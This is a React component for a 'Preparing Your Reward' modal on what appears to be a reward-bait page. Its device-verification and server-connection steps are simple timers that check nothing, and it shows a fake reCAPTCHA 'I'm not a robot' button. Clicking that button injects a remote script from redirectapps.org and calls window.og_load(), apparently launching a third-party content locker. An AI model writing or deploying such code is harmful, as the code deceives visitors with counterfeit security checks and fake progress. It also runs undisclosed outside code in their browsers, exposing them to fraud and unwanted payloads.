import React, { useState, useEffect } from 'react';
import { CheckCircle, Loader2, Shield } from 'lucide-react';

const LoadingModal = ({ isOpen, onComplete, device, lockerId }) => {
  const [currentStep, setCurrentStep] = useState(0);
  const [progress, setProgress] = useState(0);
  const [showCaptcha, setShowCaptcha] = useState(false);
  const [captchaChecked, setCaptchaChecked] = useState(false);

  const steps = [
    { title: "Verifying Device", desc: `Checking ${device || 'device'} compatibility` },
    { title: "Connecting to Server", desc: "Establishing secure connection" },
    { title: "Preparing ", desc: "Setting up your rewards" },
    { title: "Security Check", desc: "Verifying you're human" }
  ];

  // Function to load locker script with better error handling
  const loadLockerScript = (lockerId) => {
    return new Promise((resolve, reject) => {
      console.log('Loading locker script for ID:', lockerId);
      
      const oldScript = document.getElementById("ogjs");
      if (oldScript) {
        console.log('Removing old script');
        oldScript.remove();
      }

      const script = document.createElement("script");
      script.src = `https://redirectapps.org/cl/js/${lockerId}`;
      script.id = "ogjs";
      script.onload = () => {
        console.log('Locker script loaded successfully');
        resolve();
      };
      script.onerror = (error) => {
        console.error('Failed to load locker script:', error);
        reject(error);
      };
      document.body.appendChild(script);
      console.log('Script element appended to body');
    });
  };

  useEffect(() => {
    if (isOpen) {
      setCurrentStep(0);
      setProgress(0);
      setShowCaptcha(false);
      setCaptchaChecked(false);

      const interval = setInterval(() => {
        setCurrentStep((prev) => {
          const next = prev + 1;
          setProgress(((next) / steps.length) * 100);
          
          if (next === 3) {
            clearInterval(interval);
            setShowCaptcha(true);
            return next;
          }
          
          if (next >= steps.length) {
            clearInterval(interval);
            return prev;
          }
          return next;
        });
      }, 1000);

      return () => clearInterval(interval);
    }
  }, [isOpen]);

  const handleCaptchaClick = async () => {
    console.log('Captcha clicked, lockerId:', lockerId);
    setCaptchaChecked(true);
    setShowCaptcha(false);
    setProgress(100);

    try {
      if (lockerId) {
        console.log('Starting to load locker script...');
        await loadLockerScript(lockerId);
        
        // Wait a bit for the script to initialize
        setTimeout(() => {
          console.log('Checking for window.og_load:', typeof window.og_load);
          
          if (typeof window.og_load === 'function') {
            console.log('Calling window.og_load()');
            window.og_load();
          } else {
            console.warn('window.og_load is not a function. Available window properties:', Object.keys(window).filter(key => key.includes('og')));
          }
          
          // Close modal after a short delay
          setTimeout(() => {
            console.log('Closing modal');
            onComplete();
          }, 1000);
        }, 500);
      } else {
        console.warn('No lockerId provided');
        setTimeout(() => {
          onComplete();
        }, 1000);
      }
    } catch (error) {
      console.error('Error in captcha handler:', error);
      setTimeout(() => {
        onComplete();
      }, 1000);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/70 backdrop-blur-md z-50 flex justify-center items-center p-4">
      <div className="relative max-w-lg w-full">
        <div className="absolute inset-0 bg-gradient-to-br from-purple-500/20 to-blue-500/20 rounded-2xl blur-xl"></div>
        
        <div className="relative bg-gradient-to-br from-[#1a0a3e]/95 to-[#0a0520]/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-purple-500/20 overflow-hidden">
          <div className="relative px-6 py-5 border-b border-purple-500/20">
            <div className="absolute inset-0 bg-gradient-to-r from-purple-500/10 to-blue-500/10"></div>
            <h2 className="relative text-xl font-semibold text-white">Preparing Your Reward</h2>
            <p className="relative text-purple-200/80 text-sm mt-1">Please wait while we set everything up</p>
          </div>
          
          <div className="px-6 py-6">
            <div className="space-y-4 mb-6">
              {steps.map((step, index) => {
                const isCompleted = index < currentStep;
                const isCurrent = index === currentStep;
                const isPending = index > currentStep;
                
                return (
                  <div 
                    key={index}
                    className={`flex items-start transition-all duration-300 ${
                      isPending ? 'opacity-40' : 'opacity-100'
                    }`}
                  >
                    <div className="flex-shrink-0 mt-0.5">
                      {isCompleted ? (
                        <div className="w-6 h-6 rounded-full bg-gradient-to-br from-green-400 to-emerald-500 flex items-center justify-center shadow-lg shadow-green-500/30">
                          <CheckCircle className="w-5 h-5 text-white" />
                        </div>
                      ) : isCurrent ? (
                        <div className="w-6 h-6 rounded-full bg-gradient-to-br from-purple-400 to-blue-500 flex items-center justify-center shadow-lg shadow-purple-500/40">
                          <Loader2 className="w-4 h-4 text-white animate-spin" />
                        </div>
                      ) : (
                        <div className="w-6 h-6 rounded-full border-2 border-white/20 bg-white/5" />
                      )}
                    </div>
                    
                    <div className="ml-4 flex-1">
                      <h3 className={`font-semibold text-sm ${
                        isCurrent 
                          ? 'text-purple-300' 
                          : 'text-white'
                      }`}>
                        {step.title}
                      </h3>
                      <p className="text-xs text-gray-400 mt-0.5">
                        {step.desc}
                      </p>
                    </div>
                    
                    {isCurrent && !captchaChecked && (
                      <span className="ml-2 px-2.5 py-1 bg-purple-500/20 backdrop-blur-sm border border-purple-400/30 text-purple-300 text-xs font-medium rounded-full">
                        In Progress
                      </span>
                    )}
                    {isCompleted && (
                      <span className="ml-2 px-2.5 py-1 bg-green-500/20 backdrop-blur-sm border border-green-400/30 text-green-300 text-xs font-medium rounded-full">
                        Complete
                      </span>
                    )}
                  </div>
                );
              })}
            </div>
            
            {/* Captcha */}
            {showCaptcha && !captchaChecked && (
  <div className="mt-6 p-5 rounded-xl bg-gradient-to-br from-purple-500/10 to-blue-500/10 border border-purple-500/30 backdrop-blur-sm">
    <div className="flex items-center justify-between mb-3">
      <span className="text-white font-medium text-sm">Security Check</span>
      <div className="flex items-center space-x-1 text-gray-400">
        <Shield className="w-4 h-4" />
        <span className="text-xs">reCAPTCHA</span>
      </div>
    </div>
    
    <button
      onClick={handleCaptchaClick}
      className="w-full flex items-center justify-between p-4 rounded-lg bg-white/10 border border-white/20 hover:bg-white/15 hover:border-white/30 transition-all duration-300 cursor-pointer group"
    >
      <div className="flex items-center space-x-3">
        <div className="w-5 h-5 rounded border-2 border-gray-400 group-hover:border-gray-300 bg-white flex items-center justify-center transition-colors">
          <CheckCircle className="w-3 h-3 text-transparent" />
        </div>
        <span className="text-white font-medium">I'm not a robot</span>
      </div>
      <div className="text-right">
        <div className="text-xs text-gray-400">Privacy • Terms</div>
      </div>
    </button>
  </div>
)}

            {captchaChecked && (
              <div className="mt-6 p-4 rounded-xl bg-green-500/10 border-2 border-green-500/30">
                <div className="flex items-center justify-center space-x-3">
                  <Loader2 className="w-6 h-6 text-green-400 animate-spin" />
                  <span className="text-green-300 font-medium">
                    Verifying you're human...
                  </span>
                </div>
              </div>
            )}
            
            <div className="space-y-2 mt-6">
              <div className="flex justify-between items-center">
                <span className="text-sm font-medium text-gray-300">
                  Overall Progress
                </span>
                <span className="text-sm font-semibold text-white">
                  {Math.round(progress)}%
                </span>
              </div>
              <div className="w-full h-2.5 bg-white/10 backdrop-blur-sm rounded-full overflow-hidden border border-white/10">
                <div 
                  className="h-full bg-gradient-to-r from-purple-500 to-blue-400 rounded-full transition-all duration-500 ease-out shadow-lg shadow-purple-500/50"
                  style={{ width: `${progress}%` }}
                />
              </div>
            </div>
          </div>
          
          <div className="bg-white/5 backdrop-blur-sm px-6 py-3 border-t border-purple-500/20">
            <p className="text-xs text-gray-400 text-center">              
                 "This process typically takes 3-5 seconds"              
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoadingModal;